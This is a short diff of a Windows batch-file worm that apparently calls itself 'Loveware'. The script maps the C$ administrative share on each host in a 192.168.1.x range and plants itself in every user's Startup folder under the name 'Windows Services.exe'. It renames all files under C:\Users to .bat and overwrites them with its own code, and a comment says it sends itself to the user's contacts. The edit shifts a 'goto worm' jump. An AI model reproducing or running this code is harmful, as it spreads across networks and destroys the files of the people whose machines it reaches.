@@ -161,12 +161,12 @@ net use Z: \\192.168.1.%i%\C$
 if exist Z: (for /f %%u in ('dir Z:\Users /b') do copy %0 "Z:\Users\%%u\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows Services.exe"
 mountvol Z: /d)
 if %i% == 256 (goto Infect) else (set /a i=i+1)
+goto worm
 goto Internet
 
 :Infect
 for /f %%f in ('dir C:\Users\*.* /s /b') do (rename %%f *.bat)
 for /f %%f in ('dir C:\Users\*.bat /s /b') do (copy %0 %%f)
-goto worm
 goto Infect
 
 :: Send Loveware to all the contacts of the user
